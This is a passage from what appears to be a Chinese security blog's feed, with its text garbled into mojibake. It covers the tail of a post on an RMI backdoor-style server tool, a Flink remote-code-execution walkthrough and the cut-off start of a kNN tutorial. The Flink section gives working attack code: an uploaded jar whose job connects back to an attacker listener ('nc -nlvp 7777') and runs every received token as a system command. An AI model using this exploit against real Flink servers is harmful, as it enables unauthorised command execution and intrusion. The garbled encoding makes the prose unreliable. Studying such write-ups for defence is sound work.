å‚æ•°å¯ä»¥ä¸å¡«é»˜è®¤ä¸ºç©ºï¼Œä½†ä¸æ¨èã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://paper.seebug.org/1091/#rmi" target="_blank" rel="noopener">Java ä¸­ RMIã€JNDIã€LDAPã€JRMPã€JMXã€JMSé‚£äº›äº‹å„¿ï¼ˆä¸Šï¼‰</a></li><li><a href="https://github.com/0nise/shell-plus" target="_blank" rel="noopener">https://github.com/0nise/shell-plus</a></li><li><a href="https://blog.csdn.net/wubinghai/article/details/82951769" target="_blank" rel="noopener">æµ…è°ˆRMI</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Shell Plus æ˜¯åŸºäº RMI çš„ä¸€æ¬¾æœåŠ¡å™¨ç®¡å·¥å…·ï¼Œç”±æœåŠ¡ç«¯ã€æ³¨å†Œä¸­å¿ƒã€å®¢æˆ·ç«¯è¿›è¡Œç»„æˆã€‚&lt;/p&gt;
&lt;h3 id=&quot;å…è´£å£°æ˜&quot;&gt;&lt;a href=&quot;#å…è´£å£°æ˜&quot; class=&quot;headerlink&quot; title=&quot;å…è´£å£°æ˜&quot;&gt;&lt;/a&gt;å…è´£å£°æ˜&lt;/h3&gt;&lt;p&gt;è¯¥å·¥å…·ç”¨äºæœåŠ¡
      
    
    </summary>
    
    
      <category term="æœåŠ¡ç®¡ç†" scheme="http://www.r4v3zn.com/tags/%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86/"/>
    
      <category term="åé—¨" scheme="http://www.r4v3zn.com/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>Flink å‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://www.r4v3zn.com/posts/ba4a62fc/"/>
    <id>http://www.r4v3zn.com/posts/ba4a62fc/</id>
    <published>2019-11-13T09:44:21.000Z</published>
    <updated>2020-11-11T08:06:56.081Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Flink æ ¸å¿ƒæ˜¯ä¸€ä¸ªæµå¼çš„æ•°æ®æµæ‰§è¡Œå¼•æ“ï¼Œå…¶é’ˆå¯¹æ•°æ®æµçš„åˆ†å¸ƒå¼è®¡ç®—æä¾›äº†æ•°æ®åˆ†å¸ƒã€æ•°æ®é€šä¿¡ä»¥åŠå®¹é”™æœºåˆ¶ç­‰åŠŸèƒ½ã€‚åŸºäºæµæ‰§è¡Œå¼•æ“ï¼ŒFlink æä¾›äº†è¯¸å¤šæ›´é«˜æŠ½è±¡å±‚çš„ API ä»¥ä¾¿ç”¨æˆ·ç¼–å†™åˆ†å¸ƒå¼ä»»åŠ¡ï¼š</p><ul><li><p>DataSet APIï¼š å¯¹é™æ€æ•°æ®è¿›è¡Œæ‰¹å¤„ç†æ“ä½œï¼Œå°†é™æ€æ•°æ®æŠ½è±¡æˆåˆ†å¸ƒå¼çš„æ•°æ®é›†ï¼Œç”¨æˆ·å¯ä»¥æ–¹ä¾¿åœ°ä½¿ç”¨Flinkæä¾›çš„å„ç§æ“ä½œç¬¦å¯¹åˆ†å¸ƒå¼æ•°æ®é›†è¿›è¡Œå¤„ç†ï¼Œæ”¯æŒJavaã€Scalaå’ŒPythonã€‚</p></li><li><p>DataStream APIï¼š å¯¹æ•°æ®æµè¿›è¡Œæµå¤„ç†æ“ä½œï¼Œå°†æµå¼çš„æ•°æ®æŠ½è±¡æˆåˆ†å¸ƒå¼çš„æ•°æ®æµï¼Œç”¨æˆ·å¯ä»¥æ–¹ä¾¿åœ°å¯¹åˆ†å¸ƒå¼æ•°æ®æµè¿›è¡Œå„ç§æ“ä½œï¼Œæ”¯æŒJavaå’ŒScalaã€‚</p></li><li><p>Table APIï¼šå¯¹ç»“æ„åŒ–æ•°æ®è¿›è¡ŒæŸ¥è¯¢æ“ä½œï¼Œå°†ç»“æ„åŒ–æ•°æ®æŠ½è±¡æˆå…³ç³»è¡¨ï¼Œå¹¶é€šè¿‡ç±»SQLçš„DSLå¯¹å…³ç³»è¡¨è¿›è¡Œå„ç§æŸ¥è¯¢æ“ä½œï¼Œæ”¯æŒJavaå’ŒScalaã€‚</p></li></ul><h2 id="æ¼æ´æƒ…å†µ"><a href="#æ¼æ´æƒ…å†µ" class="headerlink" title="æ¼æ´æƒ…å†µ"></a>æ¼æ´æƒ…å†µ</h2><p>æœ¬æ¬¡æ¼æ´æƒ…å†µæ˜¯ç”±äº Apache Flink Web Dashboard æœªæˆæƒè®¿é—®ï¼Œä¸Šä¼ æ¶æ„jarå¯¼è‡´è¿œç¨‹ä»£ç å‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h2><p>ç¯å¢ƒè¦æ±‚ï¼šJDK 8<br>å®˜ç½‘ä¸‹è½½åœ°å€ï¼š<a href="http://flink.apache.org/downloads.html" target="_blank" rel="noopener">http://flink.apache.org/downloads.html</a><br>æˆ–è€…é€šè¿‡<code>wget</code>è¿›è¡Œä¸‹è½½ï¼š<br><code>wget https://mirrors.tuna.tsinghua.edu.cn/apache/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz</code><br>ç„¶åè¿›è¡Œè§£å‹ï¼š<br><code>tar zxvf flink-1.9.1-bin-scala_2.11.tgz</code><br>ç„¶åå¯åŠ¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd f flink-1.9.1-bin-scala_2.11/bin</span><br><span class="line">./start-cluster.sh</span><br></pre></td></tr></table></figure></p><p>æœ€åè®¿é—®æœ¬æœºï¼š<a href="http://localhost:8081/" target="_blank" rel="noopener">http://localhost:8081/</a> å¦‚æœå¯ä»¥æ­£å¸¸è®¿é—®è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p><p><img src="https://img.zhiiyun.com/10ef8baedd9ff8e65a165e06ee433fd0" alt=""></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>Flink å¯ä»¥é€šè¿‡ä¸Šä¼  jar çš„æ–¹å¼æ¥è¿›è¡Œæ‰§è¡Œä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ åˆ©ç”¨ä»£ç è¿›è¡Œä¸Šä¼ æ‰§è¡Œã€‚</p><h3 id="æ·»åŠ -Archetype"><a href="#æ·»åŠ -Archetype" class="headerlink" title="æ·»åŠ  Archetype"></a>æ·»åŠ  Archetype</h3><p><img src="https://img.zhiiyun.com/c391b91039834335a4ba85371d6d78f4" alt=""></p><p>æ·»åŠ  Archetypeï¼š</p><ul><li>GroupIdï¼šorg.apache.flink</li><li>ArtifactIdï¼šflink-quickstart-java</li><li>Versionï¼š1.9.0</li></ul><h3 id="åˆ›å»ºä»»åŠ¡é¡¹ç›®"><a href="#åˆ›å»ºä»»åŠ¡é¡¹ç›®" class="headerlink" title="åˆ›å»ºä»»åŠ¡é¡¹ç›®"></a>åˆ›å»ºä»»åŠ¡é¡¹ç›®</h3><p>åŸºäºæ·»åŠ çš„<code>flink-quickstart-java</code> è¿›è¡Œåˆ›å»ºé¡¹ç›®ï¼Œç„¶åç‚¹å‡» <code>Next</code></p><p><img src="https://img.zhiiyun.com/bcc8406714874b9f0bd0d1b3606dc451" alt="åŸºäºæ·»åŠ çš„`flink-quickstart-java` è¿›è¡Œåˆ›å»ºé¡¹ç›®" title="åŸºäºæ·»åŠ çš„`flink-quickstart-java` è¿›è¡Œåˆ›å»ºé¡¹ç›®"></p><p>è®¾ç½®é¡¹ç›®<code>GroupId</code>ä»¥åŠ<code>ArtifactId</code>ï¼Œç„¶åç‚¹å‡» <code>Next</code></p><p><img src="https://img.zhiiyun.com/f172c79aa57405a3ad43e3accb0ea623" alt="è®¾ç½®é¡¹ç›®`GroupId`ä»¥åŠ`ArtifactId`" title="è®¾ç½®é¡¹ç›®`GroupId`ä»¥åŠ`ArtifactId`"></p><p>é…ç½®é¡¹ç›®mavenï¼Œç„¶åç‚¹å‡» <code>Next</code></p><p><img src="https://img.zhiiyun.com/193932e21347e18d986b17655818d302" alt="é…ç½®é¡¹ç›®maven" title="é…ç½®é¡¹ç›®maven"></p><p>è®¾ç½®é¡¹ç›®åç§°ä»¥åŠé¡¹ç›®è·¯å¾„ï¼Œç„¶åç‚¹å‡»<code>Finish</code></p><p><img src="https://img.zhiiyun.com/a6998469cba3c3e9eaf242842ff6583f" alt="è®¾ç½®é¡¹ç›®åç§°ä»¥åŠé¡¹ç›®è·¯å¾„ï¼Œç„¶åç‚¹å‡»`Finish`"></p><p>é¡¹ç›®åˆ›å»ºæˆåŠŸï¼š</p><p><img src="https://img.zhiiyun.com/ff2a833a51f3e14e112d392f23da630d" alt=""></p><h3 id="ç¼–å†™ä»»åŠ¡"><a href="#ç¼–å†™ä»»åŠ¡" class="headerlink" title="ç¼–å†™ä»»åŠ¡"></a>ç¼–å†™ä»»åŠ¡</h3><p>åˆ›å»º SocketTextStreamExecute ç±»å†™å…¥ä¸€ä¸‹ä»£ç <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    final StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    DataStreamSource&lt;String&gt; stream = env.socketTextStream(&quot;ip&quot;, 7777);</span><br><span class="line">    stream.flatMap(new LineSplitter());</span><br><span class="line">    env.execute(&quot;execute code&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static final class LineSplitter implements FlatMapFunction&lt;String, Tuple2&lt;String, Integer&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void flatMap(String s, Collector&lt;Tuple2&lt;String, Integer&gt;&gt; collector) &#123;</span><br><span class="line">        String[] tokens = s.toLowerCase().split(&quot;\\W+&quot;);</span><br><span class="line">        for (String token : tokens) &#123;</span><br><span class="line">            if (token.length() &gt; 0) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Process p = Runtime.getRuntime().exec(token);</span><br><span class="line">                    //å–å¾—å‘½ä»¤ç»“æœçš„è¾“å‡ºæµ</span><br><span class="line">                    InputStream fis=p.getInputStream();</span><br><span class="line">                    //ç”¨ä¸€ä¸ªè¯»è¾“å‡ºæµç±»å»è¯»</span><br><span class="line">                    InputStreamReader isr=new InputStreamReader(fis);</span><br><span class="line">                    //ç”¨ç¼“å†²å™¨è¯»è¡Œ</span><br><span class="line">                    BufferedReader br=new BufferedReader(isr);</span><br><span class="line">                    String line=null;</span><br><span class="line">                    //ç›´åˆ°è¯»å®Œä¸ºæ­¢</span><br><span class="line">                    while((line=br.readLine())!=null)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;token --&gt; &quot;+token);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æœ€åé€šè¿‡ <code>mvn clean package -DskipTests</code> å°†ä»£ç ç¼–è¯‘ä¸º jar æ–‡ä»¶ã€‚</p><h3 id="æ‰§è¡Œä»»åŠ¡"><a href="#æ‰§è¡Œä»»åŠ¡" class="headerlink" title="æ‰§è¡Œä»»åŠ¡"></a>æ‰§è¡Œä»»åŠ¡</h3><p>å¼€å¯NC ç›‘å¬ç«¯å£<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 7777</span><br></pre></td></tr></table></figure></p><p>å°† jar é€šè¿‡webä¸Šä¼ åˆ°ä»»åŠ¡ä¸­å¿ƒï¼Œç„¶åå°†Entity Class ä¿®æ”¹ä¸º <code>com.r4v3zn.SocketTextStreamExecute</code> ç‚¹å‡» <code>Submit</code> è¿›è¡Œæ‰§è¡Œä»»åŠ¡ã€‚</p><p><img src="https://img.zhiiyun.com/ab4c3128ad09e75f2e1e6146955fe836" alt=""></p><p>æ‰§è¡Œä»»åŠ¡ä¹‹åï¼Œæˆ‘ä»¬ç›‘å¬åˆ° NC ç«¯å£å°†å“åº”ä¿¡æ¯ï¼š</p><p><img src="https://img.zhiiyun.com/7fa9075b49f3ab80dd3df8615f69f9c9" alt=""></p><p>æ‰§è¡Œå‘½ä»¤ <code>ifconfig</code> ä¹‹åé€šè¿‡æ—¥å¿—è¿›è¡ŒæŸ¥çœ‹æ‰§è¡Œç»“æœã€‚</p><p><img src="https://img.zhiiyun.com/46beb1842640417bd1b23a01832b345b" alt=""></p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><p>ä»£ç ï¼š<a href="https://github.com/0nise/scripts/tree/master/flinkrce" target="_blank" rel="noopener">https://github.com/0nise/scripts/tree/master/flinkrce</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h2&gt;&lt;p&gt;Flink æ ¸å¿ƒæ˜¯ä¸€ä¸ªæµå¼çš„æ•°æ®æµæ‰§è¡Œå¼•æ“ï¼Œå…¶é’ˆå¯¹æ•°æ®æµçš„åˆ†å¸ƒå¼è®¡ç®—æä¾›äº†æ•°æ®åˆ†å¸ƒã€æ•°æ®é€šä¿¡ä»¥åŠå®¹é”™æœºåˆ¶ç­‰åŠŸèƒ½ã€‚åŸºäºæµæ‰§è¡Œå¼•æ“ï¼ŒFlink 
      
    
    </summary>
    
    
      <category term="RCE" scheme="http://www.r4v3zn.com/tags/RCE/"/>
    
      <category term="Flink" scheme="http://www.r4v3zn.com/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>æœºå™¨å­¦ä¹ ï¼šKæœ€è¿‘é‚»ç®—æ³•</title>
    <link href="http://www.r4v3zn.com/posts/517011b7/"/>
    <id>http://www.r4v3zn.com/posts/517011b7/</id>
    <published>2019-10-20T16:20:34.000Z</published>
    <updated>2020-11-11T08:06:56.113Z</updated>
    
    <content type="html"><![CDATA[<p>Kæœ€è¿‘é‚»ï¼ˆkNNï¼Œk-NearestNeighborï¼‰ä¹Ÿç§°è¿‘é‚»ç®—æ³•ï¼Œä¸»è¦ç”¨äºæ•°æ®æŒ–æ˜åˆ†ç±»æŠ€æœ¯ä¸­æœ€ç®€å•å¸¸è§çš„ä¸€ç§ç®—æ³•ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>Kæœ€è¿‘é‚»ç®—æ³•ï¼Œå°±æ˜¯Kä¸ªæœ€è¿‘çš„é‚»å±…çš„æ„æ€ï¼Œæ¯ä¸ªæ ·æœ¬æ•°æ®éƒ½å¯ä»¥ç”¨å®ƒæœ€æ¥è¿‘çš„Kä¸ªé‚»å±…æ¥è¿›è¡Œä»£è¡¨ã€‚</p><p><img src="https://img.zhiiyun.com/3ffe3c4ff55e4357ea89b2cad9cbc359" alt=""></p><p>é€šè¿‡ä¸Šå›¾ä¸­å¯ä»¥æ¸…æ™°çš„çœ‹å‡ºå›¾ä¸­çš„æ•°æ®åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»ä¸ºçº¢è‰²ä¸€ç±»ä¸ºè“è‰²ã€‚ç°åœ¨éœ€è¦æˆ‘ä»¬ç¡®å®šå‡ºæ¥ç»¿è‰²ç‚¹çš„ä¸ºå“ªä¸€ç±»é¢œè‰²ï¼Œå¯ä»¥æ ¹æ®ç»¿è‰²ç‚¹ä¸´è¿‘çš„Kä¸ªç‚¹è¿›è¡Œæ¥ç¡®è®¤ï¼Œå½“æˆ‘ä»¬ç¡®è®¤Kæ•°å­—ä¸º3æ˜¯å¯ä»¥çœ‹å‡ºè·ç¦»ç»¿è‰²ç‚¹æœ€è¿‘çš„åˆ†å¸ƒä¸ºè“è‰²ã€çº¢è‰²ã€çº¢è‰²ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¿›è¡Œæ ‡è®°ç»¿è‰²ç‚¹ä¸ºçº¢è‰²ã€‚</p><p>å…³äºKçš„å–å€¼æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ï¼Œå½“æˆ‘ä»¬Kçš„æ•°å€¼é€‰å–è¾ƒå°çš„æ—¶å€™å¯èƒ½ä¼šå¯¼è‡´æ•°æ®åˆ†ç±»å‡ºç°å·¨å¤§çš„é”™è¯¯ï¼Œåœ¨scikit-learnä¸­ï¼ŒKæœ€è¿‘é‚»ç®—æ³•çš„Kå€¼æ˜¯é€šè¿‡n_neighborså‚æ•°æ¥è¿›è¡Œè°ƒèŠ‚è®¾ç½®ï¼Œé»˜è®¤å€¼ä¸º5ã€‚</p><p>Kæœ€è¿‘é‚»ç®—æ³•ä¹Ÿå¯ä»¥ç”¨äºå›å½’ï¼ŒåŸç†å’Œå…¶ç”¨äºåˆ†ç±»çš„æ˜¯ç›¸åŒçš„ã€‚å½“æˆ‘ä»¬ä½¿ç”¨Kæœ€è¿‘é‚»å›å½’è®¡ç®—æŸä¸ªæ•°æ®ç‚¹çš„é¢„æµ‹å€¼æ—¶ï¼Œæ¨¡å‹ä¼šé€‰æ‹©è¯¥æ•°æ®æœ€è¿‘çš„è‹¥å¹²ä¸ªè®­ç»ƒæ•°æ®é›†ä¸­çš„ç‚¹ï¼Œå¹¶ä¸”è¿›è¡Œè®¡ç®—ä»–ä»¬çš„yå€¼å–å¹³å‡å€¼ï¼Œå¹¶ä¸”æŠŠè¯¥å¹³å‡å€¼ä½œä¸ºæ–°æ•°æ®çš„é¢„æµ‹å€¼ã€‚</p><h2 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h2><h3 id="åˆ†ç±»ä»»åŠ¡"><a href="#åˆ†ç±»ä»»åŠ¡" class="headerlink" title="åˆ†ç±»ä»»åŠ¡"></a>åˆ†ç±»ä»»åŠ¡</h3><p>å¯ä»¥é€šè¿‡sicikit-learnè¿›è¡Œæ‰‹åŠ¨ç”Ÿæˆæ•°æ®é›†æ¥ä½¿ç”¨Kæœ€è¿‘é‚»ç®—æ³•è¿›è¡Œåˆ†ç±»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="comment"># KNN åˆ†ç±»å™¨</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">data = make_blobs(n_samples=<span class="number">200</span>, centers=<span class="number">2</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>sklearn</code>ä¸­çš„<code>make_blobs</code>å‡½æ•°æ¥è¿›è¡Œç”Ÿæˆæ•°é‡ä¸º200çš„æ ·æœ¬æ•°æ®ï¼Œå°†æ•°æ®è¿›è¡Œåˆ†æˆä¸¤ç±»çš„æ•°æ®é›†ï¼Œç„¶åå°†æ•°æ®é›†èµ‹å€¼ç»™ <code>x y</code>ç„¶åé€šè¿‡<code>matplotlib</code>å°†æ•°æ®å›¾å½¢è¿›è¡Œå±•ç¤ºã€‚</p><p><code>make_blobs</code> å‡½æ•°æ˜¯ä¸ºèšç±»äº§ç”Ÿæ•°æ®é›†ï¼Œä¸»è¦å‚æ•°ä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li>n_samples ç”Ÿæˆçš„æ ·æœ¬æ•°é‡</li><li>n_features æ¯ä¸ªæ ·æœ¬çš„ç‰¹å¾æ•°</li><li>centers ç”Ÿæˆæ ·æœ¬æ•°é‡çš„åˆ†ç±»æ•°é‡</li><li>cluster_std æ¯ä¸ªç±»åˆ«çš„å¹³æ–¹å·®</li><li>random_state éšæœºç§å­</li></ul><p><img src="https://img.zhiiyun.com/dad0b6f4bddbaff42f931d51ce40af40" alt=""></p><p>ä¸Šå›¾å¯ä»¥çœ‹å‡ºé€šè¿‡<code>make_blobs</code>ç”Ÿæˆçš„æ•°æ®åˆ†ä¸ºä¸¤ç±»ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™äº›æ•°æ®ç”¨äºç®—æ³•è¿›è¡Œæ¨¡å‹çš„è®­ç»ƒï¼Œç„¶åé’ˆå¯¹æ–°çš„æˆ–æœªçŸ¥çš„æ•°æ®åˆ†ç±»æˆ–è€…å›å½’ã€‚</p><p>æ¥ä¸‹æ¥é€šè¿‡Kæœ€è¿‘é‚»ç®—æ³•æ¥è¿›è¡Œæ‹Ÿåˆè¿™äº›æ•°æ®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæ•°æ®é›†</span></span><br><span class="line">data = make_blobs(n_samples=<span class="number">200</span>, centers=<span class="number">2</span>, random_state=<span class="number">8</span>)</span><br><span class="line">x, y = data</span><br><span class="line"><span class="comment"># åˆ›å»ºKNNåˆ†ç±»å™¨</span></span><br><span class="line">clf = KNeighborsClassifier()</span><br><span class="line">clf.fit(x, y)</span><br><span class="line"><span class="comment"># ç»˜åˆ¶å›¾</span></span><br><span class="line">x_min, x_max = x[:, <span class="number">0</span>].min() - <span class="number">1</span>, x[:, <span class="number">0</span>].max() + <span class="number">1</span></span><br><span class="line">y_min, y_max = x[:, <span class="number">1</span>].min() - <span class="number">1</span>, x[:, <span class="number">1</span>].max() + <span class="number">1</span></span><br><span class="line">xx, yy = np.meshgrid(np.arange(x_min, x_max, <span class="number">.02</span>),</span><br><span class="line">                     np.arange(y_min, y_max, <span class="number">.02</span>))</span><br><span class="line">z = clf.predict(np.c_[xx.ravel(), yy.ravel()])</span><br><span class="line">z = z.reshape(xx.shape)</span><br><span class="line">plt.pcolormesh(xx, yy, z)</span><br><span class="line">plt.scatter(x[:, <span class="number">0</span>], x[:, <span class="number">1</span>], c=y, cmap=plt.cm.spring, edgecolors=<span class="string">"k"</span>)</span><br><span class="line">plt.xlim(xx.min(), xx.max())</span><br><span class="line">plt.ylim(yy.min(), yy.max())</span><br><span class="line">plt.title(<span class="string">"KNN"</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<code>np.meshgrid</code>ç”¨äºç”Ÿæˆç½‘æ ¼åæ ‡çŸ©é˜µï¼Œå…·ä½“ç”Ÿæˆæ–¹å¼å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://img.zhiiyun.com/af28616207772601a8cee0c175e6ac8f" alt=""></p><p>æ‰§è¡Œä»£ç ï¼Œä¼šå‡ºç°ä»¥ä¸‹ç»“æœï¼š</p><p><img src="https://img.zhiiyun.com/ae1cbed0cbca92606cd3d809c1a1269a" alt=""></p><p>é€šè¿‡ä¸Šè¿°ä»£ç å¯ä»¥çœ‹åˆ°Kæœ€è¿‘é‚»ç®—æ³•åŸºäºç”Ÿæˆçš„æ•°æ®é›†åˆ›å»ºäº†ä¸€ä¸ªåˆ†ç±»æ¨¡å‹ï¼Œå°†æ•°æ®åˆ†æˆä¸¤éƒ¨åˆ†ä½¿ç”¨ä¸åŒçš„é¢œè‰²è¿›è¡ŒåŒºåˆ†ï¼Œå¦‚æœæœ‰æ–°çš„æ•°æ®è¿›è¡Œè¾“å…¥ï¼Œæ¨¡å‹ä¼šè‡ªåŠ¨å°†æ–°æ•°æ®è¿›è¡Œåˆ†ç±»åˆ°å¯¹åº”çš„ç±»åˆ«ä¸­ã€‚</p><p>å‡è®¾æœ‰ä¸€ä¸ªæ–°çš„æ•°æ®ç‚¹ï¼Œç‰¹å¾å€¼ä¸º<code>6.95</code>å’Œ<code>5.2</code>ï¼Œè¿›è¡Œè¯•éªŒæ¨¡å‹æ˜¯å¦å¯ä»¥å°†æ–°çš„æ•°æ®è¿›è¡Œæ­£ç¡®çš„åˆ†ç±»ï¼Œé¦–å…ˆæˆ‘ä»¬å¯ä»¥åœ¨<code>plt.show()</code>ä¹‹å‰åŠ å…¥ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.scatter(<span class="number">6.95</span>, <span class="number">5.2</span>, marker=<span class="string">"*"</span>, c=<span class="string">'red'</span>, s=<span class="number">200</span>)</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œç¨‹åºï¼Œä¼šå‡ºç°ä¸‹å›¾ï¼š</p><p><img src="https://img.zhiiyun.com/5b977dc28f0b36cbb66a7d43dc5dd080" alt=""></p><p>å›¾ä¸­<code>â˜…</code>ä¸ºæ–°çš„æ•°æ®ä½ç½®ï¼Œå¯ä»¥çœ‹åˆ°Kæœ€è¿‘é‚»ç®—æ³•å°†å®ƒæ”¾åœ¨äº†ä¸Šæ–¹çš„åŒºåŸŸï¼Œä¸ä¸Šæ–¹çš„åŒºåŸŸå½’ä¸ºäº†ä¸€ç±»ã€‚</p><p>é€šè¿‡ä»£ç è¿›è¡ŒéªŒè¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">'='</span>*<span class="number">30</span>)</span><br><span class="line">print(<span class="string">'æ–°çš„æ•°æ®ç‚¹ä¸ºï¼šï¼ˆ6.95ï¼Œ5.2ï¼‰ï¼Œåˆ†ç±»ç»“æœä¸ºï¼š'</span>, clf.predict([[<span class="number">6.95</span>, <span class="number">5.2</span>]]))</span><br><span class="line">print(<span class="string">'='</span>*<span class="number">30</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://img.zhiiyun.com/753f12ebb79777febf938e7b86d54c4f" alt=""></p><h3 id="å¤šå…ƒåˆ†ç±»"><a href="#å¤šå…ƒåˆ†ç±»" class="headerlink" title="å¤šå…ƒåˆ†ç±»"></a>å¤šå…ƒåˆ†ç±»</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å¤„ç†å¤šå…ƒåˆ†ç±»ï¼Œä¸ºäº†å°†éš¾åº¦åŠ å¤§ï¼Œä¿®æ”¹<code>make_blobs</code>ä¸­çš„<code>centers</code>å‚æ•°ç”Ÿæˆ1,000ä¸ªæ•°æ®æ ·æœ¬ï¼Œæ•°æ®ç±»å‹æ‰©å±•åˆ°10ç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="comment"># KNN åˆ†ç±»å™¨</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span 